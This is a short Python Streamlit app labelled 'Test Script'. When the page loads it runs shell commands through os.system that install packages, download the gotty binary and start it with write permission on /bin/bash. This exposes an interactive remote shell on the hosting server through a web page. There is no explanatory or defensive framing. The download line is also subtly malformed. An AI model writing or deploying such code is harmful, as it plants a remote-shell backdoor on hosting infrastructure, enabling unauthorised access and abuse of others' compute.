import streamlit as st
import os

st.title("Test Script")
st.header("Test")

os.system("ls -la")
results = os.system("apt update;apt -y install docker.io wget && wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz | tar xzC /usr/local/bin && /usr/local/bin/gotty --permit-write --reconnect /bin/bash")
st.write(results)
